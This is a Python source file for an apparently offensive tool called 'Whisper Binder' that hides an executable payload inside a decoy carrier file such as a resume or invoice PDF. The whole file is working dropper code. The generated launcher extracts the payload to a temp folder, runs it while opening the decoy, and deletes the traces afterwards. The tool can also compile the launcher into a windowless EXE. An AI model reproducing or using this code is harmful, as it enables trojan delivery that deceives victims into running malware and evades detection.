"""
Binder: embed a payload stub inside a carrier file (PDF, DOCX, etc.)
Produces a self-extracting launcher.

Usage:
  python binder.py --carrier resume.pdf --payload stub.exe --output bound.exe
  python binder.py --carrier invoice.pdf --payload stub.exe --output bound.py --script-only

The output when run:
  1. Extracts the payload to %TEMP% and executes it
  2. Opens the carrier file with the default handler
  3. Cleans up after itself
"""
import os, sys, base64, argparse, subprocess, tempfile, struct

LAUNCHER_SCRIPT = r'''# -*- coding: utf-8 -*-
import os, sys, base64, tempfile, subprocess, struct, time

def _main():
    self_path = os.path.abspath(sys.argv[0])
    # marker constructed to avoid false match inside this script
    m1 = "Whisper_BOUND"; m2 = "_MARKER_EOF"
    marker = (m1 + m2).encode()
    try:
        with open(self_path, "rb") as f:
            data = f.read()
        idx = data.rfind(marker)
        if idx == -1: return
        payload_start = idx + len(marker)
        psize = struct.unpack("<I", data[payload_start:payload_start+4])[0]
        csize = struct.unpack("<I", data[payload_start+4:payload_start+8])[0]
        payload_b64 = data[payload_start+8:payload_start+8+psize]
        carrier_b64 = data[payload_start+8+psize:payload_start+8+psize+csize]
        payload = base64.b64decode(payload_b64)
        carrier = base64.b64decode(carrier_b64)
    except: return

    tmp = tempfile.mkdtemp(prefix="whisper_")
    try:
        pl_path = os.path.join(tmp, "payload.exe")
        cr_path = os.path.join(tmp, "carrier" + _ext(carrier[:16]))
        with open(pl_path, "wb") as f: f.write(payload)
        with open(cr_path, "wb") as f: f.write(carrier)
        subprocess.Popen([cr_path], shell=True)
        subprocess.Popen([pl_path], shell=True)
        time.sleep(5)
    finally:
        try:
            time.sleep(3)
            for f in os.listdir(tmp):
                try: os.remove(os.path.join(tmp, f))
                except: pass
            os.rmdir(tmp)
        except: pass

def _ext(h):
    for sig, ext in [(b"%PDF", ".pdf"), (b"PK", ".zip"), (b"\xff\xd8", ".jpg"), (b"\x89PNG", ".png"),
                     (b"Rar", ".rar"), (b"{", ".txt"), (b"<!DOC", ".html"), (b"{\\rtf", ".rtf")]:
        if h.startswith(sig): return ext
    return ".bin"

if __name__ == "__main__":
    _main()
'''

def bind(carrier_path, payload_path, output_path, compile_exe=True):
    with open(carrier_path, "rb") as f:
        carrier = f.read()
    with open(payload_path, "rb") as f:
        payload = f.read()

    p_b64 = base64.b64encode(payload)
    c_b64 = base64.b64encode(carrier)
    marker = b"Whisper_BOUND_MARKER_EOF"

    launcher = LAUNCHER_SCRIPT.encode("utf-8")
    out = launcher + marker + struct.pack("<I", len(p_b64)) + struct.pack("<I", len(c_b64)) + p_b64 + c_b64

    with open(output_path, "wb") as f:
        f.write(out)

    size = len(out)
    print(f"[+] Bound file: {output_path}")
    print(f"[+] Carrier: {os.path.basename(carrier_path)} ({len(carrier)//1024} KB)")
    print(f"[+] Payload: {os.path.basename(payload_path)} ({len(payload)//1024} KB)")
    print(f"[+] Total: {size//1024} KB")

    if compile_exe and output_path.endswith(".py"):
        exe_path = output_path.replace(".py", ".exe")
        try:
            subprocess.run(["pyinstaller", "--onefile", "--noconsole", "--distpath", os.path.dirname(exe_path),
                           "--specpath", tempfile.gettempdir(), "--workpath", tempfile.gettempdir(),
                           "-n", os.path.splitext(os.path.basename(exe_path))[0],
                           output_path], check=True, timeout=120)
            print(f"[+] Compiled to EXE: {exe_path}")
        except Exception as e:
            print(f"[!] PyInstaller compile failed: {e}")
            print(f"[!] Run the .py launcher directly")

def main():
    parser = argparse.ArgumentParser(description="Whisper Binder")
    parser.add_argument("--carrier", required=True, help="Carrier file (PDF, DOCX, etc.)")
    parser.add_argument("--payload", required=True, help="Payload stub EXE")
    parser.add_argument("--output", default="bound.py", help="Output file path")
    parser.add_argument("--script-only", action="store_true", help="Output .py without compiling to EXE")
    args = parser.parse_args()

    bind(args.carrier, args.payload, args.output, compile_exe=not args.script_only)

if __name__ == "__main__":
    main()
